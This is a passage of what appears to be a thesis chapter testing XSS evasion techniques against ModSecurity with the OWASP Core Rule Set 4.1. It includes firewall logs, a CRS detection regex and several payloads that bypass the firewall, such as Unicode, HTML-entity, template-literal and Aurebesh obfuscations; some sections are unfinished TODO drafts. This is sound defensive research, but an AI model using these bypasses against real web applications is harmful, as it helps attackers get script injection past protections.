\subsection{Single Iteration Evaluation}
\label{sec:singleiterationeva}
This chapter states the evaluation results of a single iteration of application of an evasion technique to the specified payloads. If a considerable (from the perspective of the author of this work) bypass was found, the result will be detailed. Evaluation results of blocked requests are not further investigated.


\subsubsection{Payload length}
\label{sec:paylensingleiter}
As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS'), label={lst:alertXSSblocked}]
<payload>alert('XSS')</payload>
<message>"Javascript method detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

Filling the request with filler data in the form: \\
\verb|/**aa..a**/alert('XSS')| \\
will cause the request to be blocked by ModSecurity without matching on any CoreRuleSet rule:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=request body bigger than maximum, label={lst:requesttoobig}]
<payload>/**aaa...(131052 more a)**/alert('XSS')</payload>
<message>"Failed to parse request body."</message>
<file>"/nginx/modsecurity.d/modsecurity.conf"</file>
<fileDetails>[line "76"] [id "200002"]<fileDetails>
<MatchedData>"Request body excluding files is bigger than the maximum expected."</MatchedData>
\end{lstlisting}

It takes exactly 131073 1-byte characters to reach this limit. If one less character is used in the request body, the ModSecurity firewall will match on \verb|alert(|, like in Listing~\ref{lst:alertXSSblocked}. This corresponds to the 131072 limit with rejection by default on exceeding the limit stated in the ModSecurity configuration file.


\subsubsection{Unicode encoding in JSON}
\label{sec:unicodeinjsontest}
The ModSecurity firewall detects and blocks requests containing \verb|${| followed by a closing \verb|}| after an arbitrary number of characters in between.
Tests have shown that using Unicode encoding in JSON and substituting the \verb|$| in a JSON request with \verb|\u0024| evades the previously mentioned detection, but triggers another firewall rule: \\
\verb|Possible Unicode character bypass detected|:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:jsonunicodetests}]
<payload>${`alert`}</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<payload>\u0024{alert`}</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>
\end{lstlisting}

\subsubsection{Unicode Normalization}
\label{sec:uninormsingleiter}
The following payload using the function \verb|alert()| is being blocked by the ModSecurity Firewall using CRS 4.1:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertnormalizemeblocked]
<payload>alert("normalizeMe")</payload>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
<message>"Javascript method detected"</message>
\end{lstlisting}

If the opening \verb|(| is substituted with the "Superscript Left Parenthesis" (U+207D), the payload bypasses the filter:

\begin{lstlisting}[style=basicStyle, caption=alert('normalizeMe') bypass, label=lst:alertnormalizemebypass]
alert\u{207D}'normalizeMe')
\end{lstlisting}

Calling \verb|.normalize('NFKD')| on the bypassed string:

\begin{lstlisting}[style=basicStyle]
"alert\u{207D}'normalizeMe')".normalize('NFKD')
\end{lstlisting}

will convert the string to the original payload:

\begin{lstlisting}[style=basicStyle]
"alert('normalizeMe')"
\end{lstlisting}

As such, this payload would be a valid bypass on web applications that normalize payloads on incoming requests using the NFKD or another normalization algorith that normalizes the payload equally.


\subsubsection{Case Alternation}
\label{sec:casealternationevaluation}
As seen in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked. Similarly, the payload \verb|aLeRT('XSS')| is being blocked by the ModSecurity Firewall using CRS4.1.:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertcasealternationblocked]
<payload>aLeRT('XSS')</payload>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"aLeRT("</MatchedData>
<message>"Javascript method detected"</message>
\end{lstlisting}

The specific warning that the firewall writes to its log on blocking the case-alternated payload gives a reason as to why the payload is being filtered:
\begin{lstlisting}[style=basicStyle, caption=ModSecurity warning on case alternated payloads, label={lst:modsecwarning}]
	ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)\b(?:eval|set(?:timeout|interval)|new[\s\x0b]+Function|a(?:lert|tob)|btoa|prompt|confirm)[\s\x0b]*\('
\end{lstlisting}
The \verb|(?i)| regex modifier at the beginning of the rule instructs the regex engine to ignore case.


% \subsubsection{Comment Interference}
% {\color{red}TODO XSS comment interference}
% The example given by Ally Petitt \cite{medium/allypetitt} in Section~\ref{sec:commint} has been tested against the ModSecurity Firewall using CRS4.1. The original payload: \verb|?id=1+union+select+1,2,3--| is being blocked by the firewall:
%
% \begin{lstlisting}[style=ruleStyle, language=XML, caption=union select injection blocked, label=lst:sqliblocked]
% <payload>?id=1+union+select+1,2,3--</payload>
%
% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
% <fileDetails>[line "205"] [id "942190"]<fileDetails>
% <MatchedData>"union select"</MatchedData>
% <message>"Detects MSSQL code execution and information gathering attempts"</message>
%
% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
% <fileDetails>[line "469"] [id "942360"]<fileDetails>
% <MatchedData>"1 union select"</MatchedData>
% <message>"Detects concatenated basic SQL injection and SQLLFI attempts"</message>
% \end{lstlisting}
%
% Similarly, the modified payload using Comment Interference: \verb|?id=1+un/**/ion+sel/**/ect+1,2,3--| is detected and blocked:
%
% \begin{lstlisting}[style=ruleStyle, language=XML, caption=Comment Interference in SQL blocked, label=lst:commentinterferenceinsqlblocked]
% <payload>?id=1+un/**/ion+sel/**/ect+1,2,3--</payload>
% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
% <fileDetails>[line "205"] [id "942190"]<fileDetails>
% <MatchedData>"union select"</MatchedData>
% <message>"Detects MSSQL code execution and information gathering attempts"</message>
% \end{lstlisting}
%
% The fact that the ModSecurity Firewall using CRS4.1 blocks this specifically crafted payload does not proof that using Comment Interference will never make payloads bypass the firewall. No more research was conducted into this idea, therefore Comment Interference is not being considered when crafting bypassing payloads in multiple steps in the following section.
%

\subsubsection{Percent Encoding}
\label{sec:percencsingleiter}
The ModSecurity firewall detects some percent-encoded payloads. Requests with plain as well as percent-encoded payloads were sent to the reverse proxy. All requests triggered the same rules:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=url encoded example blocked, label={lst:urlencodedexampleblocked}]
<payload>alert(`${new Date()}`)</payload>
<payload>urllib.parse.quote_plus('alert(`${new Date()}`)')</payload>
<payload>'alert%28%60%24%7Bnew+Date%28%29%7D%60%29'</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${new date()}"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

Many rules that are delivered as part of the CoreRuleSet in version 4.1 use the \verb|t:urlDecode| or \verb|t:urlDecodeUni| transformations that transforms a filtered request by url decoding input strings before checking for rule matches. Therefore, using percent (url-) encoding to try and bypass a firewall equipped with rules from CRS4.1 is considered futile.

\subsubsection{Charset Alternation}
\label{sec:charaltsingleiter}
The ModSecurity firewall using CRS4.1 blocks the payload:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=charset alternation example blocked, label={lst:charsetaltexampleblocked}]
<payload>"<script>alert("xss")</script>"</payload>

<message>"XSS Attack Detected via libinjection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "116"] [id "941100"]<fileDetails>
<MatchedData>"<script>alert(\x22xss\x22)</script>"</MatchedData>

<message>"XSS Filter - Category 1: Script Tag Vector"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "142"] [id "941110"]<fileDetails>
<MatchedData>"<script>"</MatchedData>

<message>"NoScript XSS InjectionChecker: HTML Injection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "234"] [id "941160"]<fileDetails>
<MatchedData>"<script"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "748"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

after encoding the payload to \verb|UTF-16|, the payload:

\begin{lstlisting}[style=basicStyle]
\xff\xfe<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x00'\x00x\x00s\x00s\x00'\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00
\end{lstlisting}

successfully evades the filtering of the firewall. In order to for this payload to have any effect, the Web server receiving the HTTP request containing this payload needs to be informed that this payload is encoded in \verb|UTF-16|. For that purpose, the HTTP header: \\
\verb|Content-Type: text/html; charset=utf-16| is added to the request.

The ModSecurity firewall using CRS4.1 does not allow specifying \verb|UTF-16| as charset in the \verb|Content-Type| header:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=utf-16 charset header blocked, label={lst:utf16charsetheaderblocked}]
<payload>-H 'Content-Type: text/html; charset=utf-16'</payload>

<message>"Request content type charset is not allowed by policy"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1021"] [id "920480"]<fileDetails>
<MatchedData>"utf-16"</MatchedData>
\end{lstlisting}

The firewall log further states that the firewall 

\begin{quote}
	Matched "Operator `Within' with parameter `|utf-8| |iso-8859-1| |iso-8859-15| |windows-1252|' against variable `TX:content\_type\_charset'
\end{quote}

Subsequently, every encoding permitted by this rule has been tested with the initial payload. There is no difference between the string in any of the allowed encodings. As it seems, the byte representation of first 127 characters is equal between all tested encodings. \cite{enc/diffa, enc/diffb, enc/diffc} Therefore, none of the allowed encodings can be used to create a bypassing payload from the initial payload. 


\subsubsection{HTML character references}
\label{sec:htmlcharrefsingleeva}
The example payload mentioned under Section~\ref{sec:htmlcharreftech} has been tested against the ModSecurity firewall using CRS4.1:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss injection blocked, label={lst:storedxssinjblocked}]
<payload><a href=javascript:alert('a')>ClickMeFor$</a></payload>

<message>"NoScript XSS InjectionChecker: Attribute Injection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "259"] [id "941170"]<fileDetails>
<MatchedData>"javascript:alert('a')>ClickMeFor$<"</MatchedData>

<message>"IE XSS Filters - Attack Detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "357"] [id "941210"]<fileDetails>
<MatchedData>"javascript:a"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "748"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

On escaping the first \verb|a| in \verb|javascript:| using the HTML hex character reference, the payload becomes:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
<a href=jav^\&\#x61^;script:alert('a')>ClickMeFor$</a>
\end{lstlisting}

This payload bypasses the rules with ids \verb|941170| (NoScript XSS InjectionChecker: Attribute Injection) and \verb|941210|(IE XSS Filters - Attack Detected). 

As this result is promising, another iteration of applying this technique has been used in the multi iteration evaluation. The results are stated unter Section~\ref{sec:doublehtmlcharref}.

\subsubsection{From charcode}
\label{sec:charcodesingleiter}
As stated under Section~\ref{sec:fromcharcodetech}, a payload where the string containing malicious JavaScript statements was substituted by a call to \verb|String.fromCharCode()| was tested against the ModSecurity firewall using CRS4.1:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=fromCharCode blocked, label={lst:fromcharcodeblocked}]
<payload>String.fromCharCode(^0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29^)</payload>

<message>"Node.js Injection Attack 1/2"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"String.fromCharCode"</MatchedData>
\end{lstlisting}

This rule matches on the character sequence \verb|String.fromCharCode| while this evasion technique depends on using this function. Further use of this technique would require to split the statement into a minimum of two parts. Section~\ref{sec:charcodemultiiter} follows up on this idea. In a single iteration, the firewall effectively prohibits payloads obscured using this technique.

\subsubsection{String concatenation}
\label{sec:stringconcsingleiter}
The example payload mentioned under Section~\ref{sec:stringconc}:

\begin{lstlisting}[style=basicStyle, language=Python]
"alert('concatenation')"
\end{lstlisting}

was used to evaluate the tested firewall against this evasion technique. The ModSecurity firewall using CRS4.1 blocks requests containing this payload according to the following rule:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=fromCharCode blocked, label={lst:fromcharcodeblocked}]
<payload>"alert('concatenation')"</payload>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XS"</file>
<fileDetails>[line "748"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

after using string concatenation to craft an obscured variant of the example payload:

\begin{lstlisting}[style=basicStyle, language=Python]
'alert' + '(`concatenation`)'
\end{lstlisting}

the payload successfully evaded the firewall rule and reached the tested Web server. As mentioned under Section~\ref{sec:stringconc}, this technique is more effective when combined with forced evaluation. Evalutation results of combining this technique with using the function constructor to force the evaluation of the payload are stated under Section~\ref{sec:funconstrconbypass} and Section~\ref{sec:charcodemultiiter}.



\subsubsection{Function Constructor}
\label{sec:functionconstructorsingleeva}


{\color{red}TODO also: mention global objects here \cite{js/builtin}}

\subsubsection{Tagged Template Literals}
\label{sec:taggedtemplateliteralsevaluation}
As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall.
After substituting the function call using \verb|('XSS')| with a Tagged Template Literal in the form of \verb|alert`XSS`|, the payload successfully bypasses the firewall and reaches the web server:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert`XSS` bypass, label=lst:alertXSSbypass]
<payload>alert("XSS")</payload>
<bypass>alert`XSS`</bypass>
\end{lstlisting}

{\color{red} hier evtl noch etwas mehr...}

\subsubsection{eval() function}
The ModSecurity firewall using CRS 4.1.0. checks for usage of the function \verb|eval()| and tries to block requests containing it. An example is listed in Listing~\ref{lst:evalalertXSSblocked}.
{\color{red} hier evtl noch etwas mehr...}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=eval(`al` + `e` + `rt('XSS')`) blocking example, label={lst:evalalertXSSblocked}]
<payload>eval(`al` + `e` + `rt('XSS')`)</payload>
<file>"rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "331"] [id "933160"]<fileDetails>
<MatchedData>"eval(`al`   `e`   `rt('XSS')"</MatchedData>

<file>"rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"eval("</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}

\subsubsection{JSFuck}
The payload \verb|alert('XSS')| has been sent to the Web Application and blocked (Listing~\ref{lst:alertXSSblocked}). Subsequently the payload was obscured using the service provided by JSFuck: https://jsfuck.com/ \\
The resulting payload is shown in Listing~\ref{lst:alertxssjsfuck}. The ModSecurity firewall using CRS 4.1 detects the JSFuck "encoding" and blocks the payload:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS') in JSFuck blocked, label={lst:alertxssjsfuckblocked}]
<payload>^(Listing~\ref{lst:alertxssjsfuck})^</payload>
<message>"JSFuck / Hieroglyphy obfuscation detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "654"] [id "941360"]<fileDetails>
<MatchedData>
"Suspicious payload found within ARGS_NAMES:[][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]][([][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]] [])[ (11337 characters omitted)"
</MatchedData>
<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}


\subsubsection{Aurebesh.js}
\label{sec:aurebeshevaluation}
When sending the payload \verb|prompt()|, the ModSecurity firewall using CRS 4.1 detects the \gls{xss} attempt and blocks the request:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=prompt(1\,2) blocked, label=lst:promptblocked]
<payload>prompt(1,2)</payload>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}
If the Aurebesh technique is used to substitute most of the payload with the characters \verb|A-I| as well as \verb|() + [] ! ' = {}|, the obscured payload bypasses the firewall:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=Aurebesh prompt bypass, label=lst:aurebeshpromptbypass]
<payload>prompt(1,2)</payload>
<bypass>A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I]('p'+F+D[A]+'m'+'p'+E+'(A,++A)')()</bypass>
\end{lstlisting}

For an explanation on how the payload mentioned in Listing~\ref{lst:aurebeshpromptbypass} was created, see Section~\ref{sec:aurebesh}.

The aurebesh evaluation concludes the single iteration evaluation. In the following subsection, payloads obscured through multiple iterations will be evaluated against the tested firewall configuration of an nginx reverse proxy using ModSecurity equipped with rules from the CoreRuleSet version 4.1.


